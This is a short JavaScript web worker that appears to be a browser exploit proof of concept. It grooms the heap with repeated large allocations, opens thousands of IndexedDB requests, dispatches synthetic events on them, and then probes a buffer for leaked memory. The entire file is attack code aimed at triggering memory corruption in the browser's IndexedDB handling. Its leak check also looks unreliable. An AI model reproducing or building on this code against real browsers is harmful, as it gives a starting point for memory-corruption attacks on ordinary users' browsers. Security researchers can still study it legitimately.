function freememory() {
    for (var i = 0; i < 1000; i++) {
        a = new Uint8Array(1024 * 1000);
    }
}

function checkMemoryLeak() {
    const buf = new Uint8Array(4);
    buf.fill(0x46);
    return buf[0] !== 0x46 ? `Leak: 0x${buf[0].toString(16)}` : null;
}

self.onmessage = function(e) {
    if (e.data === 'start') {
        self.postMessage('Grooming heap...');
        freememory();

        self.postMessage('Opening IndexedDB...');
        for (let i = 0; i < 5000; i++) {
            let req = indexedDB.open(`db${i}`);
            let ev = new Event('mine');
            try {
                req.dispatchEvent(ev);
            } catch (error) {
                self.postMessage(`Error at iteration ${i}: ${error.message}`);
            }
            req = 0;
            ev = 0;
            if (i % 500 === 0) {
                freememory();
                const leak = checkMemoryLeak();
                if (leak) {
                    self.postMessage(leak);
                }
            }
        }

        self.postMessage('Checking IndexedDB state...');
        let req = indexedDB.open('testdb');
        if (req.readyState === 'done') {
            self.postMessage('IndexedDB state as expected');
        } else {
            self.postMessage(`Unexpected IndexedDB state: ${req.readyState}`);
        }

        const leak = checkMemoryLeak();
        if (leak) {
            self.postMessage(leak);
        } else {
            self.postMessage('No memory changes detected');
        }
    }
};